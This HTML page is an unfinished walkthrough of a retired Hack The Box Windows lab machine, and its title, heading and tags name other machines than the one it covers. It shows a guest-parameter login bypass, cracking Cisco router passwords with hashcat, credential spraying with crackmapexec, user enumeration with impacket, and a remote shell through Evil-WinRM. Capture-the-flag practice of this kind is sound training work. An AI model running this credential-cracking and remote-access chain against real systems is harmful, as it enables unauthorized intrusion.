<html>

<head>
    <title>VulnHub Write-up: Hacker Fest 2019</title>
    <link rel="stylesheet" type="text/css" href="index.css">
</head>

<body>
    <article>
        <h1>HTB Walkthrough | Obscurity</h1>
        <div class="tag-container">
            <span class="tag">htb</span>
            <span class="tag">linux</span>
            <span class="tag">python</span>
            <span class="tag">crypto</span>
        </div>
        <p class="last-update">Last updated on May 2020.</p>

        <p class="intro">
            Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/201" target="_blank">here</a>.
        </p>

        <div class="step">
            <p>1. After doing an initial scan with nmap, we find 3 exposed services: a web server on port 80, RPC on port 135 and SMBv2 on port 445.</p>
            <img class="step_img" src="/imgs/heist/img1.png"/>
        </div>
        <div class="step">
            <p>
                2. After trying and failing to acess the SMB service with null credentials, I moved on to the web server.
            </p>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">root@kali:/#</span>
                    <code>smbclient -L heist.htb</code>
                </div>
                <div class="code-line">
                    <code>Enter WORKGROUP\root's password: </code>
                </div>
                <div class="code-line">
                    <code>session setup failed: NT_STATUS_ACCESS_DENIED</code>
                </div>
            </div>
        </div>
        <div class="step">
            <p>3. Wappalyzer gives us a nice overview of this server.</p>
            <img class="step_img_sm" src="/imgs/heist/img2.png"/>
        </div>
        <div class="step">
            <p>
                4. The initial page redirects to the <a hred="http://heist.htb/login.php" target="_blank">login</a> page.<br>
                After poking around a bit we realize that by adding <a hred="http://heist.htb/login.php?guest=true" target="_blank">guest=true</a> as a query parameter, we're redirected to an <a hred="http://heist.htb/issues.php" target="_blank">issues</a> page.<br>
                On this page, there is what looks like a conversation between a user named Hazard and a member of the support team for a Cisco router.
            </p>
            <img class="step_img_md" src="/imgs/heist/img3.png"/>
        </div>
        <div class="step">
            <p>
                5. Hazard was kind enough to provide us with a configuration file for their router, which is hosted at <a href="http://heist.htb/attachments/config.txt" target="_blank">http://heist.htb/attachments/config.txt</a>.<br>
                Unfortunately, we can't access other attachments which would have been interesting, so let's go throug the config file.
            </p>
            <img src="imgs/heist/img4.png"/>
        </div>

        <div class="step">
            <p>6. This config file contains:</p>
            <ul>
                <li>2 user passwords encrypted with a <a href="https://www.cisco.com/c/en/us/support/docs/security-vpn/remote-authentication-dial-user-service-radius/107614-64.html" target="_blank">weak algorithm</a> algorithm (7) which can be <a href="https://www.ifm.net.nz/cookbooks/passwordcracker.html" target="_blank">easily cracked</a>;</li>
                <li>the <i>enable secret</i> password, which is an MD5 hash.</li>
            </ul>
            <p>Also, this file let's us know that this router's passwords are at least 12 chars long.</p>
        </div>

        <div class="step">
            <p>7. To crack the MD5 hash we use <a href="https://hashcat.net/hashcat/" target="_blank">hashcat</a> combined with the RockYou list, which we'll filter by words >= 12 chars.</p>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">root@kali:/#</span>
                    <code>hashcat -a 0 -m 500 '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' rockyou_12andabove.txt</code>
                </div>
            </div>
            <p>where:</p>
            <ul>
                <li>-a 0 = "straight" attack-mode</li>
                <li>-m 500 = Cisco-IOS $1$ (MD5) hash type</li>
            </ul>
        </div>

        <div class="step">
            <p>8. Now that we know Hazard router's password, we're going to use <a href="https://github.com/byt3bl33d3r/CrackMapExec">crackmapexec</a> to try and login as Hazard on the server.</p>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">root@kali:/#</span>
                    <code>crackmapexec heist.htb -u Hazard -p stealth1agent</code>
                </div>
                <div class="code-line">
                    <code>...</code>
                </div>
                <div class="code-line">
                    <code>CME           heist.htb:445 SUPPORTDESK           [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SUPPORTDESK)</code>
                </div>
                <div class="code-line">
                    <code>CME           heist.htb:445 SUPPORTDESK           [+] SUPPORTDESK\Hazard:xxx</code>
                </div>
            </div>
        </div>

        <div class="step">
            <p>
                9. So, we know now that the domain's name is SUPPORTDESK, that the server's SO is Windows 10 and that the credentials we found are valid for the server.<br>
                To enumerate the domain's users, we're going to use <a href="https://github.com/SecureAuthCorp/impacket" target="_blank">Impacket</a>.
            </p>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">root@kali:/#</span>
                    <code>python impacket/build/scripts-2.7/lookupsid.py SUPPORTDESK/Hazard:xxx@heist.htb</code>
                </div>
                <div class="code-line">
                    <code>Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation</code>
                </div>
                <br>
                <div class="code-line">
                    <code>[*] Brute forcing SIDs at heist.htb</code>
                </div>
                <div class="code-line">
                    <code>[*] StringBinding ncacn_np:heist.htb[\pipe\lsarpc]</code>
                </div>
                <div class="code-line">
                    <code>[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112</code>
                </div>
                <div class="code-line">
                    <code>500: SUPPORTDESK\Administrator (SidTypeUser)</code>
                </div>
                <div class="code-line">
                    <code>501: SUPPORTDESK\Guest (SidTypeUser)</code>
                </div>
                <div class="code-line">
                    <code>503: SUPPORTDESK\DefaultAccount (SidTypeUser)</code>
                </div>
                <div class="code-line">
                    <code>504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)</code>
                </div>
                <div class="code-line">
                    <code>513: SUPPORTDESK\None (SidTypeGroup)</code>
                </div>
                <div class="code-line">
                    <code>1008: SUPPORTDESK\Hazard (SidTypeUser)</code>
                </div>
                <div class="code-line">
                    <code>1009: SUPPORTDESK\support (SidTypeUser)</code>
                </div>
                <div class="code-line">
                    <code>1012: SUPPORTDESK\Chase (SidTypeUser)</code>
                </div>
                <div class="code-line">
                    <code>1013: SUPPORTDESK\Jason (SidTypeUser)</code>
                </div>
            </div>
        </div>

        <div class="step">
            <p>10. So, let's create a file with all the users we know about and a file with the 3 passwords we cracked and let's see what works:</p>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">root@kali:/#</span>
                    <code>crackmapexec heist.htb -d SUPPORTDESK -u users.txt -p passwords.txt</code>
                </div>
            </div>
            <p>P.S. According to crackmapexec's manual the -u option should allow a file to be passed as an argument, but this didn't work so I had to test each user individually.</p>
        </div>

        <div class="step">
            <p>11. We find that one of the credentials are valid for user Chase, so let's try to establish a remote connection for that user using Evil-RCM:</p>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">root@kali:/#</span>
                    <code>ruby evil-winrm/evil-winrm.rb -i heist.htb -u Chase -p 'xxx'</code>
                </div>
                <div class="code-line">
                    <code>Evil-WinRM shell v1.9</code>
                </div>
                <div class="code-line">
                    <code>Evil-WinRM shell v1.9</code>
                </div>
                <div class="code-line">
                    <code>Info: Establishing connection to remote endpoint</code>
                </div>
                <div class="code-line">
                    <code>*Evil-WinRM* PS C:\Users\Chase\Documents>  </code>
                </div>
                <div class="code-line">
                    <code>Evil-WinRM shell v1.9</code>
                </div>
            </div>
        </div>

        <div class="step">
            <p>12. The user's flag is on the Dektop!</p>
        </div>

        <div class="step">
            <p>13. TBC</p>
        </div>
    </article>
</body>
</html>